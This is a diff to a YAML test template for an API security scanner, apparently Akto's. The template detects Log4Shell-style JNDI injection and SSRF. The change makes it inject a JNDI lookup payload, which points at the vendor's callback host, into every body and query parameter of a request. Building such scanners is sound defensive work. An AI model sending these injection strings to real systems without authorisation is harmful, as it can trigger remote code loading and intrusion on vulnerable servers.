@@ -77,12 +77,12 @@ api_selection_filters:
         for_one:
           key:
             regex: ".*"
-            extract: bodyKey
+            extractMultiple: bodyKey
     - query_param:
         for_one:
           key:
             regex: ".*"
-            extract: queryKey
+            extractMultiple: queryKey
 
 execute:
   type: single
@@ -91,9 +91,11 @@ execute:
         - send_ssrf_req:
             url: "https://test-services.akto.io/store_uuid/3523ddf7-51ef-462b-a452-f33246aae6bb"
         - modify_body_param:
-            bodyKey: "${jndi1}{jndi:https://test-services.akto.io/3523ddf7-51ef-462b-a452-f33246aae6bb}"
+            ${bodyKey}: "${jndi1}{jndi:https://test-services.akto.io/3523ddf7-51ef-462b-a452-f33246aae6bb}"
+          for_each_combination: true
         - modify_query_param:
-            queryKey: "${jndi1}{jndi:https://test-services.akto.io/3523ddf7-51ef-462b-a452-f33246aae6bb}"
+            ${queryKey}: "${jndi1}{jndi:https://test-services.akto.io/3523ddf7-51ef-462b-a452-f33246aae6bb}"
+          for_each_combination: true
 validate:
   response_payload:
     length:
